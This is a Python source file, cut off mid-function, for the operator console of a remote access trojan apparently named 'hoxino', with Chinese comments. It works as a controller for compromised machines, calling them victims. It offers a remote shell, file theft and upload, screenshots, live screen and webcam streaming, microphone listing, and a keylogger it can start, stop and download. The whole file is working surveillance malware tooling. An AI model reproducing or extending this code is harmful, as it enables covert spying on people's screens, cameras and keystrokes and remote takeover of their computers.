import socket
import json
from progress.bar import IncrementalBar
from halo import Halo
from colorama import init, Fore
import os
from datetime import datetime
import cv2
import pickle
import threading
import platform

# 检测当前环境是否有图形界面
def has_display():
    if os.name == "nt":  # Windows系统
        return True
    
    # Linux/Unix系统
    return "DISPLAY" in os.environ and os.environ["DISPLAY"] != ""

# 根据环境决定是否导入pynput
HAS_GUI = has_display()
if HAS_GUI:
    from pynput.keyboard import Listener
else:
    # 如果没有GUI，创建一个模拟的Listener类
    class MockListener:
        def __init__(self, **kwargs):
            self.on_press = kwargs.get('on_press')
            self.thread = None
            
        def __enter__(self):
            return self
            
        def __exit__(self, exc_type, exc_val, exc_tb):
            pass
            
        def join(self):
            pass
            
        def stop(self):
            pass

    Listener = MockListener

init()


class Server():
    def __init__(self, connection, addr, host_name, key_state):
        self.connection = connection
        self.addr = addr
        self.host_name = host_name
        self.key_state = key_state
        self.has_gui = HAS_GUI

    def on_press(self, key):
        key = str(key)
        self.key = key.replace("'", "")

    def start_interrupt_listener(self):
        if self.has_gui:
            with Listener(on_press=self.on_press) as self.interrupt_listener:
                self.interrupt_listener.join()
        else:
            # 在无GUI环境中，使用一个线程模拟键盘监听
            print(Fore.YELLOW+"[!]在无GUI环境中运行，使用替代键盘监听方式")
            self.key = ""
            while True:
                # 每秒检查一次是否需要停止
                if hasattr(self, 'should_stop_listener') and self.should_stop_listener:
                    break
                # 模拟'k'按键来停止流
                if self.key == "k":
                    break
                # 允许用户输入'k'来停止
                try:
                    # 非阻塞方式检查输入
                    if os.name == "nt":
                        import msvcrt
                        if msvcrt.kbhit():
                            key = msvcrt.getch().decode('utf-8', errors='replace').lower()
                            if key == 'k':
                                self.key = 'k'
                                break
                    else:
                        # 在Linux上使用更简单的方法
                        import sys, select
                        if select.select([sys.stdin], [], [], 0.1)[0]:
                            key = sys.stdin.read(1).lower()
                            if key == 'k':
                                self.key = 'k'
                                break
                except:
                    # 如果有任何问题，继续运行
                    pass
                
                import time
                time.sleep(1)

    def stop_interrupt_listener(self):
        if self.has_gui:
            self.interrupt_listener.stop()
        else:
            # 在无GUI环境中，设置标志来停止监听循环
            self.should_stop_listener = True

    def exec_cmd(self, command):
        try:
            self.connection.send(command.encode('utf-8'))
            shell_command_output_with_length = self.connection.recv(1024).decode('utf-8', errors='replace')
            
            # 检查是否有错误
            if shell_command_output_with_length.startswith("command_execute_error"):
                error_parts = shell_command_output_with_length.split(":", 1)
                error_msg = error_parts[1] if len(error_parts) > 1 else "未知错误"
                return f"{Fore.RED}[-]命令执行失败: {error_msg}"
                
            # 处理大型数据输出
            if shell_command_output_with_length == "large_command_output":
                # 告知客户端准备接收大数据
                self.connection.send("ready_for_large_output".encode())
                
                # 接收块数
                chunk_count = int(self.connection.recv(1024).decode('utf-8'))
                self.connection.send("received_chunk_count".encode())
                
                # 分块接收数据
                full_output = b""
                for _ in range(chunk_count):
                    chunk = self.connection.recv(1024)
                    full_output += chunk
                    self.connection.send("next_chunk".encode())
                
                # 解码完整输出
                return Fore.GREEN + full_output.decode('utf-8', errors='replace')
            
            # 处理普通输出
            shell_command_output_delimiter = shell_command_output_with_length.split(":shell_delimiter:")
            if len(shell_command_output_delimiter) < 2:
                return f"{Fore.RED}[-]命令执行失败: 返回数据格式错误"
                
            shell_command_output_length = int(shell_command_output_delimiter[0])
            shell_command_received_bytes = len(shell_command_output_delimiter[1].encode('utf-8'))
            
            if shell_command_output_length <= 1020:
                return Fore.GREEN + shell_command_output_delimiter[1]
            else:
                shell_command_output = shell_command_output_delimiter[1]
                # 增加超时保护
                max_attempts = 50  # 防止无限循环
                attempts = 0
                
                while shell_command_received_bytes < shell_command_output_length and attempts < max_attempts:
                    received_str = self.connection.recv(4096).decode('utf-8', errors='replace')
                    shell_command_output = shell_command_output + received_str
                    shell_command_received_bytes = shell_command_received_bytes + len(received_str.encode('utf-8'))
                    attempts += 1
                    
                return Fore.GREEN + shell_command_output
        except Exception as e:
            return f"{Fore.RED}[-]命令执行出错: {str(e)}"
            
    def create_file_name(self, operation, file_n=None):
        date = datetime.now()
        if not os.name == "nt":
            if operation == "screenshot":
                file_name = f"downloads/screenshots/{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_screenshot.png"
            elif operation == "camera snapshot":
                file_name = f"downloads/camera_snapshots/{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_camera_snapshot.png"
            elif operation == "keystroke":
                file_name = f"downloads/keystrokes/{date.day}.{date.month}.{date.year}_{date.hour}:{date.minute}:{date.second}_keystroke.txt"
            else:
                file_name = f"downloads/{file_n}"
        else:
            if operation == "screenshot":
                file_name = f"downloads\\screenshots\\{date.day}.{date.month}.{date.year}_{date.hour}_{date.minute}_{date.second}_screenshot.png"
            elif operation == "camera snapshot":
                file_name = f"downloads\\camera_snapshots\\{date.day}.{date.month}.{date.year}_{date.hour}_{date.minute}_{date.second}_camera_snapshot.png"
            elif operation == "keystroke":
                file_name = f"downloads\\keystrokes\\{date.day}.{date.month}.{date.year}_{date.hour}_{date.minute}_{date.second}_keystroke.txt"
            else:
                file_name = f"downloads\\{file_n}"

        return file_name
    
    def download_file(self, file, operation):   # file = downloads/a1.png || downloads/screenshots/victim.png
        if operation == "screenshot" or operation == "camera snapshot" or operation == "keystroke":
            spinner = Halo(text=f"正在获取{operation}", spinner="line", placement="right", color="green", text_color="green")
            spinner.start()
            client_output = self.connection.recv(1024).decode('utf-8', errors='replace')
            
            # 处理无图形界面的替代响应
            if client_output == "ss_alternative":
                spinner.succeed(f"{operation}(无图形界面替代模式)获取成功!")
                bar = IncrementalBar(f"正在下载{operation}(文本模式)", suffix='%(percent).1f%% - 已用时间:%(elapsed)ds - 预计剩余:%(eta)ds')
            elif client_output == "ss_success" or client_output == "camera_success" or client_output == "key_success":
                spinner.succeed(f"{operation}获取成功!")
                bar = IncrementalBar(f"正在下载{operation}", suffix='%(percent).1f%% - 已用时间:%(elapsed)ds - 预计剩余:%(eta)ds')
            else:
                spinner.fail(text=f"{operation}无法获取.")
                error_parts = client_output.split(":", 1)
                error_msg = error_parts[1] if len(error_parts) > 1 and not client_output == "camera_error" else "客户端发生错误"
                return Fore.RED+f"[-]{error_msg}"
        else:
            bar = IncrementalBar(f"正在下载{file}", suffix='%(percent).1f%% - 已用时间:%(elapsed)ds - 预计剩余:%(eta)ds')
        
        # 接收文件大小
        file_size = self.connection.recv(1024).decode('utf-8', errors='replace')
        if file_size.startswith("download_error"):
            error_parts = file_size.split(":", 1)
            error_msg = error_parts[1] if len(error_parts) > 1 else "未知错误"
            return Fore.RED+f"\n[-]文件下载失败: {error_msg}"
            
        try:
            file_size = int(file_size)
        except ValueError:
            return Fore.RED+f"\n[-]文件下载失败: 接收到无效的文件大小信息"
            
        # 处理文件路径和名称
        if (file.find("/") != -1 or file.find("\\") != -1) and operation == "download":
            if os.name == "nt":
                file_name = file.split("\\")[-1]
                downloaded_file = open(f"downloads\\{file_name}", "wb")
            else:
                file_name = file.split("/")[-1]
                downloaded_file = open(f"downloads/{file_name}", "wb")
        else:
            downloaded_file = open(self.create_file_name(operation, file), "wb")
            
        # 增加缓冲区大小
        buffer_size = 4096
        file_content = self.connection.recv(buffer_size)
        received_bytes = len(file_content)
        bar.next((received_bytes/file_size)*100)
        
        # 防止无限循环
        max_attempts = int(file_size / buffer_size) + 10
        attempts = 0
        
        while file_content and attempts < max_attempts:
            downloaded_file.write(file_content)
            if file_size > received_bytes:
                file_content = self.connection.recv(buffer_size)
                received_bytes = received_bytes + len(file_content)
                bar.next((len(file_content)/file_size)*100)
                attempts += 1
            else:
                downloaded_file.close()
                if operation == "screenshot" or operation == "camera snapshot" or operation == "keystroke":
                    return Fore.LIGHTGREEN_EX+f"\n[+]{operation}下载成功."
                else:
                    return Fore.LIGHTGREEN_EX+f"\n[+]{file}下载成功."
                
        # 检查是否因为超出尝试次数而退出
        if attempts >= max_attempts:
            downloaded_file.close()
            return Fore.RED+f"\n[-]文件下载失败: 接收超时或文件过大"
        
        # 正常完成下载
        downloaded_file.close()
        return Fore.LIGHTGREEN_EX+f"\n[+]文件下载完成"
                    
    def upload_file(self, file, upload_path):
        bar = IncrementalBar(f"正在上传{file}", suffix='%(percent).1f%% - 已用时间:%(elapsed)ds - 预计剩余:%(eta)ds')
        try:
            file_ = open(file, "rb")
        except Exception as e:
            self.connection.send("upload_error".encode('utf-8'))
            return Fore.RED+f"[-]{file}不存在或无法访问: {str(e)}"
            
        # 获取文件大小
        file_size = len(file_.read())
        file_.close()
        file_ = open(file, "rb")
        
        # 发送文件大小
        self.connection.send(str(file_size).encode('utf-8'))
        upload_path_output = self.connection.recv(4096).decode('utf-8', errors='replace')
        
        if upload_path_output == "upload_path_error":
            return Fore.RED+f"[-]{upload_path}在目标主机上不存在或您没有写入权限。请输入有效路径。"
            
        # 设置更大的缓冲区
        buffer_size = 4096
        file_content = file_.read(buffer_size)
        sent_bytes = 0
        
        while file_content:
            chunk_size = len(file_content)
            sent_bytes += chunk_size
            progress = (sent_bytes / file_size) * 100
            bar.next(progress - bar.index)  # 更新进度条到正确位置
            
            self.connection.send(file_content)
            file_content = file_.read(buffer_size)
            
        file_.close()
        return Fore.LIGHTGREEN_EX+f"\n[+]{file}上传成功。"
    
    def cam_stream(self):
        print(Fore.BLUE+"[!]摄像头流开始。按'k'停止。")
        self.key = ""
        self.should_stop_listener = False
        interrupt_listener_thread = threading.Thread(target=self.start_interrupt_listener)
        interrupt_listener_thread.start()
        
        # 接收第一条消息以确定是正常摄像头流还是文本模式
        initial_response = self.connection.recv(1024).decode('utf-8', errors='replace')
        
        # 无图形界面的摄像头文本模式处理
        if initial_response == "camera_text_mode":
            print(Fore.YELLOW+"[!]客户端无图形界面，使用文本模式替代摄像头流...")
            # 告知客户端准备好接收文本模式数据
            self.connection.send("ready_for_camera_text".encode('utf-8'))
            
            try:
                # 显示一个模拟的摄像头窗口
                if os.name == "nt":
                    os.system("cls")
                else:
                    os.system("clear")
                    
                print(Fore.GREEN + "====== 无图形界面摄像头模拟 ======")
                print(Fore.CYAN + "正在显示远程系统信息作为摄像头流...")
                print(Fore.YELLOW + "按 'k' 键停止流")
                
                while True:
                    # 接收摄像头帧
                    frame_data = self.connection.recv(16384).decode('utf-8', errors='replace')
                    
                    # 检查是否是有效的摄像头帧
                    if frame_data.startswith("camera_frame:"):
                        # 提取JSON数据
                        json_data = frame_data[13:]  # 跳过 "camera_frame:"
                        try:
                            # 解析JSON
                            frame_info = json.loads(json_data)
                            
                            # 清屏
                            if os.name == "nt":
                                os.system("cls")
                            else:
                                os.system("clear")
                                
                            # 显示格式化的信息
                            print(Fore.GREEN + f"====== 无图形界面摄像头模拟 (帧: {frame_info.get('frame', 0)}) ======")
                            print(Fore.CYAN + f"时间: {frame_info.get('time', 'N/A')}")
                            print(Fore.YELLOW + "==== CPU信息 ====")
                            print(Fore.WHITE + frame_info.get('cpu', 'N/A'))
                            print(Fore.YELLOW + "==== 内存信息 ====")
                            print(Fore.WHITE + frame_info.get('memory', 'N/A'))
                            print(Fore.YELLOW + "==== 进程信息 ====")
                            print(Fore.WHITE + frame_info.get('processes', 'N/A'))
                            print(Fore.GREEN + "==========================================")
                            print(Fore.RED + "按 'k' 键停止摄像头流")
                            
                            # 检查是否按下了k键
                            if self.key == "k":
                                self.connection.send("stop_camera".encode('utf-8'))
                                break
                            else:
                                # 发送继续指令
                                self.connection.send("continue_camera".encode('utf-8'))
                                
                        except json.JSONDecodeError:
                            print(Fore.RED + "解析摄像头数据失败")
                            self.connection.send("stop_camera".encode('utf-8'))
                            break
                    else:
                        # 收到无效数据，停止流
                        self.connection.send("stop_camera".encode('utf-8'))
                        break
                        
                    # 检查是否按下了k键
                    if self.key == "k":
                        self.connection.send("stop_camera".encode('utf-8'))
                        break
                
                return Fore.LIGHTGREEN_EX+"[+]摄像头流(文本模式)已停止。"
                
            except Exception as e:
                return Fore.RED+f"[-]摄像头流(文本模式)失败: {str(e)}"
        
        # 处理标准摄像头流
        else:
            try:
                # 检查当前环境是否支持GUI
                if not self.has_gui:
                    # 如果服务器端没有GUI，则发送错误消息并返回
                    print(Fore.RED+"[-]服务器在无图形界面环境下无法显示摄像头流")
                    print(Fore.YELLOW+"[!]请在有图形界面的环境中运行此命令，或使用其他命令")
                    self.connection.send("cam_stop".encode())
                    return Fore.RED+"[-]服务器缺少图形界面环境，无法显示摄像头流"

                img_size = initial_response
                if img_size == "camera_error":
                    error_parts = img_size.split(":", 1)
                    error_msg = error_parts[1] if len(error_parts) > 1 else "请输入有效的摄像头索引。"
                    return Fore.RED+f"[-]{error_msg}"
                img_size = int(img_size)
                self.connection.send("get_size".encode())
                img = self.connection.recv(1024)
                img_content = img
                received_bytes = len(img)
                while img:
                    if img_size > received_bytes:
                        img = self.connection.recv(1024)
                        img_content = img_content + img
                        received_bytes = received_bytes + len(img)
                    else:
                        loaded_img = pickle.loads(img_content)
                        cv2.imshow(f"摄像头 {self.host_name}@{self.addr[0]}:{self.addr[1]}", loaded_img)
                        cv2.waitKey(10)
                        self.connection.send("get_img".encode())
                        break
                if self.key == "k":
                    self.interrupt_listener.stop()
                    raise KeyboardInterrupt
            except KeyboardInterrupt:
                self.connection.recv(1048576)
                self.connection.send("cam_stop".encode())
                cv2.destroyAllWindows()
                return Fore.LIGHTGREEN_EX+"[+]摄像头流已停止。"
            except Exception as e:
                return Fore.RED+f"[-]摄像头流失败: {str(e)}"

    def screen_stream(self):
        print(Fore.BLUE+"[!]屏幕流开始。按'k'停止。")
        self.key = ""
        self.should_stop_listener = False
        interrupt_listener_thread = threading.Thread(target=self.start_interrupt_listener)
        interrupt_listener_thread.start()
        
        # 接收第一条消息以确定是图形界面还是文本模式
        initial_response = self.connection.recv(1024).decode('utf-8', errors='replace')
        
        # 无图形界面的文本模式处理
        if initial_response == "screen_text_mode":
            print(Fore.YELLOW+"[!]客户端无图形界面，使用文本模式替代屏幕流...")
            # 告知客户端准备好接收文本模式数据
            self.connection.send("ready_for_text_mode".encode('utf-8'))
            
            try:
                # 显示一个模拟的终端窗口
                if os.name == "nt":
                    os.system("cls")
                else:
                    os.system("clear")
                    
                print(Fore.GREEN + "====== 无图形界面系统监控 ======")
                print(Fore.CYAN + "正在实时显示远程系统信息...")
                print(Fore.YELLOW + "按 'k' 键停止流")
                
                while True:
                    # 接收文本帧
                    frame_data = self.connection.recv(16384).decode('utf-8', errors='replace')
                    
                    # 检查是否是有效的文本帧
                    if frame_data.startswith("text_frame:"):
                        # 提取JSON数据
                        json_data = frame_data[11:]  # 跳过 "text_frame:"
                        try:
                            # 解析JSON
                            info = json.loads(json_data)
                            
                            # 清屏
                            if os.name == "nt":
                                os.system("cls")
                            else:
                                os.system("clear")
                                
                            # 显示格式化的信息
                            print(Fore.GREEN + "====== 无图形界面系统监控 ======")
                            print(Fore.CYAN + f"主机: {info.get('hostname', 'N/A')} | 系统: {info.get('system', 'N/A')} {info.get('release', '')}")
                            print(Fore.CYAN + f"时间: {info.get('time', 'N/A')}")
                            print(Fore.YELLOW + f"CPU使用率: {info.get('cpu_usage', 'N/A')} | 内存使用率: {info.get('memory_usage', 'N/A')}")
                            print(Fore.YELLOW + f"磁盘: {info.get('disk', 'N/A')}")
                            print(Fore.MAGENTA + f"进程数: {info.get('processes', 'N/A')}")
                            print(Fore.MAGENTA + f"运行时间: {info.get('uptime', 'N/A')}")
                            print(Fore.WHITE + "==========================================")
                            print(Fore.WHITE + f"当前目录: {info.get('current_dir', 'N/A')}")
                            print(Fore.WHITE + f"最后登录: {info.get('last_login', 'N/A')}")
                            print(Fore.GREEN + "==========================================")
                            print(Fore.RED + "按 'k' 键停止流")
                            
                            # 检查是否按下了k键
                            if self.key == "k":
                                self.connection.send("stop_text_stream".encode('utf-8'))
                                break
                            else:
                                # 发送继续指令
                                self.connection.send("continue_text_stream".encode('utf-8'))
                                
                        except json.JSONDecodeError:
                            print(Fore.RED + "解析服务器数据失败")
                            self.connection.send("stop_text_stream".encode('utf-8'))
                            break
                    else:
                        # 收到无效数据，停止流
                        self.connection.send("stop_text_stream".encode('utf-8'))
                        break
                        
                    # 检查是否按下了k键
                    if self.key == "k":
                        self.connection.send("stop_text_stream".encode('utf-8'))
                        break
                
                return Fore.LIGHTGREEN_EX+"[+]屏幕流(文本模式)已停止。"
                
            except Exception as e:
                return Fore.RED+f"[-]屏幕流(文本模式)失败: {str(e)}"
                
        # 图形界面模式的原始处理
        else:
            try:
                # 检查当前环境是否支持GUI
                if not self.has_gui:
                    # 如果服务器端没有GUI，则发送错误消息并返回
                    print(Fore.RED+"[-]服务器在无图形界面环境下无法显示屏幕流")
                    print(Fore.YELLOW+"[!]请在有图形界面的环境中运行此命令，或使用其他命令")
                    self.connection.send("screen_stop".encode())
                    return Fore.RED+"[-]服务器缺少图形界面环境，无法显示屏幕流"

                frame_size = initial_response
                if frame_size == "screen_error":
                    error_parts = frame_size.split(":", 1)
                    error_msg = error_parts[1] if len(error_parts) > 1 else "未知错误"
                    return Fore.RED+f"[-]屏幕流失败: {error_msg}"
                
                frame_size = int(frame_size)
                self.connection.send("get_size".encode())
                frame = self.connection.recv(1024)
                frame_content = frame
                received_bytes = len(frame)
                while frame:
                    if frame_size > received_bytes:
                        frame = self.connection.recv(1024)
                        frame_content = frame_content + frame
                        received_bytes = received_bytes + len(frame)
                    else:
                        loaded_frame = pickle.loads(frame_content)
                        cv2.imshow(f"SCREEN {self.host_name}@{self.addr[0]}:{self.addr[1]}", loaded_frame)
                        cv2.waitKey(10)
                        self.connection.send("get_frame".encode())
                        break
                if self.key == "k":
                    self.interrupt_listener.stop()
                    raise KeyboardInterrupt
            except KeyboardInterrupt:
                self.connection.recv(1048576)
                self.connection.send("screen_stop".encode())
                cv2.destroyAllWindows()
                return Fore.LIGHTGREEN_EX+"[+]屏幕流已停止。"
            except Exception as e:
                return Fore.RED+f"[-]屏幕流失败: {str(e)}"

    def shell(self):
        self.terminal_state = "shell_terminal"
        self.connection.send("shell".encode('utf-8'))
        current_path = self.connection.recv(4096).decode('utf-8', errors='replace')
        print(f"{Fore.CYAN}[?]欢迎使用目标主机的shell终端。输入'help'查看命令列表。\n")
        while True:
            try:
                s_command = input(f"{Fore.CYAN}┌──────({Fore.RED}shell@{self.host_name}{Fore.CYAN}) - [{Fore.LIGHTGREEN_EX}{current_path}{Fore.CYAN}]\n└───{Fore.BLUE}$ {Fore.GREEN}")
                splitted_s_command = s_command.split(" ")
                if s_command == "exit":
                    self.connection.send("exit".encode('utf-8'))
                    self.terminal_state = "hoxino_terminal"
                    return 0
                elif splitted_s_command[0] == "help":
                    print(self.help(self.terminal_state, splitted_s_command[1])) if len(splitted_s_command) > 1 else print(self.help(self.terminal_state))
                elif s_command == "clear":
                    os.system("cls") if os.name == "nt" else os.system("clear")
                elif splitted_s_command[0] == "cd":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode('utf-8'))
                        cd_output = self.connection.recv(4096).decode('utf-8', errors='replace')
                        cd_output = cd_output.split(":cd_delimiter:")
                        if cd_output[0] == "cd_success":
                            current_path = cd_output[1]
                            print(f"{Fore.LIGHTGREEN_EX}[+]目录已更改: {splitted_s_command[1]}")
                        else:
                            if len(cd_output) > 1:
                                error_reason = cd_output[1]
                                print(f"{Fore.RED}[-]目录更改失败: {error_reason}")
                            else:
                                print(f"{Fore.RED}[-]目录更改失败。可能路径不存在。")
                    else:
                        print(f"{Fore.RED}[-]目录更改失败。请输入路径。用法: cd <path>")
                elif s_command == "dir" or s_command.startswith("dir "):
                    if " /w" not in s_command and " /W" not in s_command and " /b" not in s_command and " /B" not in s_command:
                        s_command = s_command + " /w"
                        print(f"{Fore.BLUE}[!]自动添加/w参数以减少输出量: {s_command}")
                    shell_command_output = self.exec_cmd(s_command)
                    print(shell_command_output)
                elif s_command == "pwd":
                    self.connection.send(s_command.encode('utf-8'))
                    pwd_output = self.connection.recv(4096).decode('utf-8', errors='replace')
                    if pwd_output.startswith("pwd_error"):
                        error_parts = pwd_output.split(":", 1)
                        error_msg = error_parts[1] if len(error_parts) > 1 else "未知错误"
                        print(f"{Fore.RED}[-]获取当前路径失败: {error_msg}")
                    else:
                        print(Fore.LIGHTGREEN_EX + pwd_output)
                elif splitted_s_command[0] == "mkdir":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode('utf-8'))
                        mkdir_output = self.connection.recv(4096).decode('utf-8', errors='replace')
                        if mkdir_output == "mkdir_success":
                            print(f"{Fore.LIGHTGREEN_EX}[+]目录已创建: {splitted_s_command[1]}")
                        else:
                            error_parts = mkdir_output.split(":", 1)
                            error_msg = error_parts[1] if len(error_parts) > 1 else "可能目录已存在"
                            print(f"{Fore.RED}[-]创建目录失败: {error_msg}")
                    else:
                        print(f"{Fore.RED}[-]创建目录失败。请输入目录名。用法: mkdir <directory_name>")
                elif splitted_s_command[0] == "rmdir":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode('utf-8'))
                        rmdir_output = self.connection.recv(4096).decode('utf-8', errors='replace')
                        if rmdir_output == "rmdir_success":
                            print(f"{Fore.LIGHTGREEN_EX}[+]目录已删除: {splitted_s_command[1]}")
                        else:
                            error_parts = rmdir_output.split(":", 1)
                            error_msg = error_parts[1] if len(error_parts) > 1 else "可能目录不存在或不为空"
                            print(f"{Fore.RED}[-]删除目录失败: {error_msg}")
                    else:
                        print(f"{Fore.RED}[-]删除目录失败。请输入目录名。用法: rmdir <directory_name>")
                elif splitted_s_command[0] == "rm":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode('utf-8'))
                        rm_output = self.connection.recv(4096).decode('utf-8', errors='replace')
                        if rm_output == "rm_success":
                            print(f"{Fore.LIGHTGREEN_EX}[+]文件已删除: {splitted_s_command[1]}")
                        else:
                            error_parts = rm_output.split(":", 1)
                            error_msg = error_parts[1] if len(error_parts) > 1 else "可能文件不存在"
                            print(f"{Fore.RED}[-]删除文件失败: {error_msg}")
                    else:
                        print(f"{Fore.RED}[-]删除文件失败。请输入文件名。用法: rm <file_name>")
                elif splitted_s_command[0] == "rename":
                    if len(splitted_s_command) > 2:
                        self.connection.send(s_command.encode('utf-8'))
                        rename_output = self.connection.recv(4096).decode('utf-8', errors='replace')
                        if rename_output == "rename_success":
                            print(f"{Fore.LIGHTGREEN_EX}[+]重命名成功: {splitted_s_command[1]} -----> {splitted_s_command[2]}")
                        else:
                            error_parts = rename_output.split(":", 1)
                            error_msg = error_parts[1] if len(error_parts) > 1 else "可能目录/文件不存在"
                            print(f"{Fore.RED}[-]重命名失败: {error_msg}")
                    else:
                        print(f"{Fore.RED}[-]重命名失败。请输入源文件名和新文件名。用法: rename <source_name> <new_name>")
                elif splitted_s_command[0] == "download":
                    if len(splitted_s_command) > 1:
                        self.connection.send(s_command.encode('utf-8'))
                        download_output = self.download_file(splitted_s_command[1], "download")
                        print(download_output)
                    else:
                        print(f"{Fore.RED}[-]文件下载失败。请输入要下载的文件名。用法: download <file_name>")
                elif splitted_s_command[0] == "upload":
                    if len(splitted_s_command) > 1:
                        if len(splitted_s_command) > 2:
                            self.connection.send(s_command.encode('utf-8'))
                            upload_output = self.upload_file(splitted_s_command[1], splitted_s_command[2])
                            print(upload_output)
                        else:
                            if os.name == "nt":
                                file = (splitted_s_command[1].split("\\"))[-1]
                            else:
                                file = (splitted_s_command[1].split("/"))[-1]
                            s_command = s_command + f" {file}"
                            self.connection.send(s_command.encode('utf-8'))
                            upload_output = self.upload_file(splitted_s_command[1], file)
                            print(upload_output)
                    else:
                        print(f"{Fore.RED}[-]文件上传失败。请输入要上传的文件。用法: upload <file_name> <location_path_of_client>")
                else:
                    shell_command_output = self.exec_cmd(s_command)
                    print(shell_command_output)
            except KeyboardInterrupt:
                print(f"{Fore.CYAN}[!]检测到CTRL+C。正在退出shell终端...")
                try:
                    self.connection.send("exit".encode('utf-8'))
                except:
                    pass
                return 0
            except Exception as e:
                print(f"{Fore.RED}[-]执行命令时发生错误: {str(e)}")
                try:
                    self.connection.send("exit".encode('utf-8'))
                except:
                    pass
                return 0
        
    def display_text_screenshot(self, file_path):
        """显示文本格式的截图结果"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                
            # 清屏显示
            os.system("cls" if os.name == "nt" else "clear")
            print(Fore.GREEN + "====== 无图形界面系统截图 ======")
            print(Fore.CYAN + content)
            print(Fore.GREEN + "============================")
            print(Fore.YELLOW + f"[信息] 文件已保存至: {file_path}")
            return True
        except Exception as e:
            print(Fore.RED + f"[-]显示文本截图失败: {str(e)}")
            return False

    def display_cam_text(self, file_path):
        """显示文本格式的摄像头照片"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                
            # 清屏显示
            os.system("cls" if os.name == "nt" else "clear")
            print(Fore.GREEN + "====== 无图形界面摄像头照片 ======")
            print(Fore.CYAN + content)
            print(Fore.GREEN + "============================")
            print(Fore.YELLOW + f"[信息] 文件已保存至: {file_path}")
            return True
        except Exception as e:
            print(Fore.RED + f"[-]显示摄像头照片失败: {str(e)}")
            return False

    def help(self, terminal_state, command=None):
        if not os.name == "nt":
            help_file = open("json/hoxino_help.json", "r")
        else:
            help_file = open("json\\hoxino_help.json", "r")
        json_ = help_file.read()
        help_file.close()
        parsed_json = json.loads(json_)
        terminal_help_object = f"{terminal_state}_help"
        if command == None:
            splitted_parse = (parsed_json[terminal_help_object]["commands"]).split(":.:")
            return f"{Fore.LIGHTCYAN_EX}{splitted_parse[0]}{Fore.GREEN}{splitted_parse[1]}"
        else:
            try:
                if command == "all":
                    help_output = ""
                    for i in parsed_json[terminal_help_object]["detailed_commands"]:
                        splitted_parse = (parsed_json[terminal_help_object]["detailed_commands"][i]).split(":.:")
                        help_output = help_output + Fore.LIGHTCYAN_EX + splitted_parse[0] + Fore.GREEN + splitted_parse[1] + "\n\n"
                    return help_output
                else:
                    splitted_parse = (parsed_json[terminal_help_object]["detailed_commands"][command]).split(":.:")
                    return f"{Fore.LIGHTCYAN_EX}{splitted_parse[0]}{Fore.GREEN}{splitted_parse[1]}"
            except KeyError:
                return f"{Fore.RED}[-]No command found named with {command}."
    
    def main(self):
        self.terminal_state = "hoxino_terminal"
        print(f"{Fore.CYAN}[?]欢迎使用hoxino终端。输入'help'查看命令列表。\n")
        while True:
            try:
                k_command = input(f"{Fore.BLUE}┌──────({Fore.LIGHTGREEN_EX}{self.host_name}@{self.addr[0]}{Fore.BLUE})\n└───{Fore.RED}$ {Fore.GREEN}")
                splitted_k_command = k_command.split(" ")
                if k_command == "shell":
                    self.shell()
                    print(f"{Fore.BLUE}[?]欢迎回到hoxino终端。输入'help'查看命令列表。\n")
                elif k_command == "screen_shot":
                    self.connection.send("screen_shot".encode('utf-8'))
                    download_result = self.download_file("", "screenshot")
                    print(download_result)
                    
                    # 检查是否是无图形界面的文本截图
                    if "无图形界面替代模式" in download_result:
                        # 找出保存的文件名
                        for line in download_result.split('\n'):
                            if line.endswith(".png") or line.endswith(".txt"):
                                file_path = line.split('+]')[1].strip()
                                # 将.png文件重命名为.txt以便正确显示
                                if file_path.endswith(".png"):
                                    txt_path = file_path.replace(".png", ".txt")
                                    os.rename(file_path, txt_path)
                                    file_path = txt_path
                                # 显示文本截图
                                self.display_text_screenshot(file_path)
                                break
                elif k_command == "screen_stream":
                    self.connection.send("screen_stream".encode('utf-8'))
                    print(self.screen_stream())
                elif k_command == "cam_list":
                    self.connection.send("cam_list".encode('utf-8'))
                    cam_list = self.connection.recv(4096).decode('utf-8', errors='replace')
                    print(Fore.LIGHTGREEN_EX+cam_list)
                elif splitted_k_command[0] == "cam_snapshot":
                    if len(splitted_k_command) > 1:
                        self.connection.send(k_command.encode('utf-8'))
                        download_result = self.download_file("", "camera snapshot")
                        print(download_result)
                        
                        # 检查是否是文本格式的摄像头照片
                        if download_result.endswith(".png"):
                            # 提取文件路径
                            for line in download_result.split('\n'):
                                if line.endswith(".png"):
                                    file_path = line.split('+]')[1].strip()
                                    # 检查是否是文本文件
                                    try:
                                        with open(file_path, 'rb') as f:
                                            header = f.read(4)
                                        if header != b'\x89PNG':  # PNG文件头
                                            # 不是PNG文件，可能是文本文件
                                            txt_path = file_path.replace(".png", ".txt")
                                            os.rename(file_path, txt_path)
                                            self.display_cam_text(txt_path)
                                    except:
                                        pass
                                    break
                    else:
                        print(f"{Fore.RED}[-]请输入摄像头索引。您可以使用'cam_list'命令查看可用的摄像头索引。\n用法: camera_snapshot <camera_index>")
                elif splitted_k_command[0] == "cam_stream":
                    if len(splitted_k_command) > 1:
                        self.connection.send(k_command.encode('utf-8'))
                        print(self.cam_stream())
                    else:
                        print(f"{Fore.RED}[-]请输入摄像头索引。您可以使用'cam_list'命令查看可用的摄像头索引。\n用法: camera_snapshot <camera_index>")
                elif k_command == "mic_list":
                    self.connection.send("mic_list".encode('utf-8'))
                    mic_list = self.connection.recv(4096).decode('utf-8', errors='replace')
                    print(Fore.LIGHTGREEN_EX+mic_list)
                elif k_command == "keystroke_start":
                    if self.key_state == "false":
                        self.connection.send("start_key".encode('utf-8'))
                        self.key_state = "true"
                        print(f"{Fore.LIGHTGREEN_EX}[+]键盘记录已激活。")
                    else:
                        print(f"{Fore.BLUE}[!]键盘记录已经是激活状态。")
                elif k_command == "keystroke_stop":
                    if self.key_state == "true":
                        self.connection.send("stop_key".encode('utf-8'))
                        self.key_state = "false"
                        print(f"{Fore.LIGHTGREEN_EX}[+]键盘记录已停用。")
                    else:
                        print(f"{Fore.BLUE}[+]键盘记录已经是停用状态。")
                elif k_command == "keystroke_get":
                    self.connection.send("get_key".encode('utf-8'))
                    print(self.download_file("", "keystroke"))
                elif k_command == "clear":
